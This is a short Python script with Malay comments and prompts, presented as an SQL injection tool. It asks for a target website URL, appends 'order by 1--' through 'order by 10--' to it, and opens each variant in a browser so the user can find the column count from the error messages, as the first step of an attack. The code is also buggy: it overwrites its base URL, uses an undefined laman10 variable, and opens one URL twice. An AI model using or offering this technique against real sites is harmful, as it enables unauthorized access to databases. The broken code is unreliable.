# Skrip UlarSawa3 Suntikan SQL (SQLi) | Tanya alamat laman web dam menjalankan injeksi / suntikan SQL keatas nya.
# Written by Lina M / ditulis oleh Lina M. | Mei 2020

#Kod ni akan dikemaskinikan lagi tapi sebab aku tengah sibuk, jadi bersabarlah ye ...

import random
import string
import webbrowser

print ("Selamat menggunakan Skrip UlarSawa3 Suntikan SQL (SQLi) kami.")
print ("LANGKAH: 1")
print ("Masukkan alamat sasaran secara penuh, contoh www.sasaran.com/index.php?=1")
laman0 = input("[+] Alamat sasaran: ")
    
kesatuan1 = str(1)
kesatuan2 = str(2)
kesatuan3 = str(3)
kesatuan4 = str(4)
kesatuan5 = str(5)
kesatuan6 = str(6)
kesatuan7 = str(7)
kesatuan8 = str(8)
kesatuan9 = str(9)
kesatuan10 = str(10)
    
laman1 = (laman0) + ' ' + 'order by '+ kesatuan1 + '--' 
laman2 = (laman0) + ' ' + 'order by '+ kesatuan2 + '--'
laman3 = (laman0) + ' ' + 'order by '+ kesatuan3 + '--'
laman4 = (laman0) + ' ' + 'order by '+ kesatuan4 + '--'
laman5 = (laman0) + ' ' + 'order by '+ kesatuan5 + '--'
laman6 = (laman0) + ' ' + 'order by '+ kesatuan6 + '--'
laman7 = (laman0) + ' ' + 'order by '+ kesatuan7 + '--' 
laman8 = (laman0) + ' ' + 'order by '+ kesatuan8 + '--'
laman9 = (laman0) + ' ' + 'order by '+ kesatuan9 + '--'
laman0 = (laman0) + ' ' + 'order by '+ kesatuan10 + '--'

print (laman0)
print (laman1)
print (laman2)
print (laman3)
print (laman4)
print (laman5)
print (laman6)
print (laman7)
print (laman8)
print (laman9)
print (laman10)

print ("Browser akan dibuka sekarang. Kenalpasti web page mana yang mempunyai mesej ralat X.")
print ("Bilangan tiang atau column adalah -1 daripada X atau tiang iaitu X - 1.")

webbrowser.open_new(laman1)
webbrowser.open_new(laman2)
webbrowser.open_new(laman3)
webbrowser.open_new(laman4)
webbrowser.open_new(laman5)
webbrowser.open_new(laman6)
webbrowser.open_new(laman7)
webbrowser.open_new(laman7)
webbrowser.open_new(laman8)
webbrowser.open_new(laman9)
webbrowser.open_new(laman10)

# LANGKAH 2 akan diberikan pada masa akan datang ...
